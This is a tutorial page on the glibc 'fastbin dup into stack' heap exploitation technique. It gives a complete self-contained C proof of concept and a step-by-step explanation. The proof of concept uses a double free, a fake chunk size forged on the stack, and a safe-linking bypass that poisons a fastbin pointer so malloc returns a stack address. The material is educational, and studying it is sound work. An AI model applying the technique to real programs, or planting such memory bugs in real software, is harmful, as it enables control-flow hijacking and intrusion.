#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Fastbin Dup into Stack",
    description: "Extending the fastbin double-free to trick malloc into returning a pointer to a controlled location on the stack.",
    date: "2025-12-13",
    order: 21,
  ),
)<frontmatter>

= glibc Allocator: Fastbin Dup into Stack

== Introduction

This document continues from the `fastbin_dup` example. It demonstrates how the double-free vulnerability can be escalated to not just allocate a chunk that is already in use, but to trick the allocator into returning a pointer to an arbitrary, controlled location—in this case, a variable on the stack. This is a powerful technique that can often lead directly to arbitrary code execution by overwriting return addresses or other critical stack data.

The example code is `fastbin_dup_into_stack.c`.

== Prerequisites
- All prerequisites for a basic *Fastbin Double-Free*.
- *Fake Chunk Forge*: Ability to write a valid size field at the target location (e.g., on the stack) that matches the fastbin size being used.
- *Safe-Linking Bypass*: For glibc 2.32 and later, knowledge of the heap address is necessary to XOR the target pointer with the shifted heap address to satisfy the safe-linking check.

== Example from `fastbin_dup_into_stack.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>

int main()
{
	setbuf(stdout, NULL);

	unsigned long stack_var[4] __attribute__ ((aligned (0x10)));

	void *ptrs[7];
	for (int i=0; i<7; i++) {
		ptrs[i] = malloc(8);
	}

	int *a = calloc(1,8);
	int *b = calloc(1,8);
	int *c = calloc(1,8);

	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}

	free(a);
	free(b);

	// VULNERABILITY: Double Free
	free(a);

	for (int i = 0; i < 7; i++) {
		ptrs[i] = malloc(8);
	}

	unsigned long *d = calloc(1,8);
	calloc(1,8);

	// Forge fake chunk size on stack
	stack_var[1] = 0x20;

	unsigned long ptr = (unsigned long)stack_var+0x10;
	unsigned long addr = (unsigned long) d;

	// VULNERABILITY: Fastbin Poisoning
	*d = (addr >> 12) ^ ptr;

	calloc(1,8);
	void *p = calloc(1, 8);

	assert((unsigned long)p == (unsigned long)stack_var+0x10);
	return 0;
}
```

== Attack Flow Explained

This attack builds directly on the fastbin double-free. The initial setup is identical.

=== 1. Corrupt the Freelist

As before, we perform the `free(a)`, `free(b)`, `free(a)` sequence after filling the t-cache. This results in a corrupted fastbin freelist for size `0x20`.

#figure(
  table(
    columns: auto,
    inset: 10pt,
    align: center,
    [*Corrupted Fastbin Freelist (size 0x20)*],
    [HEAD -> `a`],
    [FD -> `b`],
    [FD -> `a`],
  ),
  caption: [The fastbin freelist is corrupted to `[ a, b, a ]`.],
)

=== 2. Obtain a Pointer to a Free Chunk

Next, we allocate from the fastbin. After exhausting the t-cache again, we do:

```c
unsigned long *d = calloc(1,8); // Returns a
calloc(1,8);                   // Returns b
```
At this point, the fastbin freelist is `[ a ]`, but crucially, we hold a pointer `d` that also points to chunk `a`. This gives us a write-after-free capability on the head of the freelist.

=== 3. Create a Fake Chunk on the Stack

The goal is to make the allocator think a region on the stack is a valid, free chunk. We define a target on the stack (`stack_var`) and write a fake size field to it. The size must match the fastbin we are manipulating (`0x20`).

```c
unsigned long stack_var[4];
stack_var[1] = 0x20;
```
#figure(
  table(
    columns: (auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Stack Address*], [*Content*], [*Note*],
    [`&stack_var[0]`], `...`, [Padding],
    [`&stack_var[1]`], `0x20`, [Fake size field],
    [`&stack_var[2]`], `...`, [This is where our chunk data will start],
  ),
  caption: [A fake chunk is crafted on the stack. The allocator will see `0x20` as its size.],
)

=== 4. Poison the Freelist with Safe-Linking Bypass

Now for the main exploit. We overwrite the `fd` pointer of chunk `a` (via our pointer `d`) to point to our fake stack chunk. Modern glibc uses a "safe-linking" mitigation that "poisons" the `fd` pointer by XORing it with the chunk's own address shifted. We must do the same to pass the check.

```c
unsigned long ptr = (unsigned long)stack_var + 0x10; // Target: our fake chunk's data
unsigned long addr = (unsigned long) d;             // Address of the chunk a
*d = (addr >> 12) ^ ptr;                            // Overwrite a->fd with poisoned pointer
```

The freelist is now truly corrupted.
#figure(
  table(
    columns: auto,
    inset: 10pt,
    align: center,
    [*Corrupted Fastbin Freelist (size 0x20)*],
    [HEAD -> `a`],
    [FD -> (poisoned ptr to `stack_var` )],
  ),
  caption: [The freelist head `a` now has its `fd` pointer aimed at our fake stack chunk.],
)

=== 5. Reap the Stack Pointer

The final step is to allocate twice more:
1. `calloc(1, 8)`: This returns chunk `a`. More importantly, the allocator follows `a`'s poisoned `fd` pointer and sets the head of the fastbin to our fake stack chunk.
2. `calloc(1, 8)`: The allocator happily serves the "chunk" from the head of the freelist, which is now our crafted location on the stack!

```c
// This puts the stack address on the free list
calloc(1,8);

// This returns the stack address!
void *p = calloc(1, 8);

assert((unsigned long)p == (unsigned long)stack_var+0x10);
```

The `assert` passes, confirming that `p` is a pointer to the stack. An attacker now has a `malloc`'d chunk that is actually on the stack, allowing them to overwrite saved return addresses, function pointers, or other critical data to gain control of the program.

